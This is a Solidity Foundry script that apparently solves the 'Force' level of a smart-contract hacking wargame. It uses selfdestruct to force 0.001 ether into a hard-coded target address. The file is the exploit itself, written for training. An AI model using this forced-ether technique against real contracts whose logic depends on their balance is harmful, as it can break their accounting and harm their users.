// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "../lib/forge-std/src/Script.sol";
import {Force} from "../src/Force.sol";

contract ForceScript is Script {
    SelfDestruct public selfDestruct;

    function run() public {
        depositETH();
    }

    function depositETH() public {
        vm.startBroadcast();
        selfDestruct = new SelfDestruct();
        (bool success, ) = payable(address(selfDestruct)).call{
            value: 0.001 ether
        }("");
        require(success, "Tx failed");
        selfDestruct.destroy();
        vm.stopBroadcast();
    }
}

contract SelfDestruct {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function destroy() public {
        require(msg.sender == owner, "Not owner");
        selfdestruct(payable(0x9b1C9057a1733b140c4531573393fFb33f7C24Ff));
    }

    receive() external payable {}
}
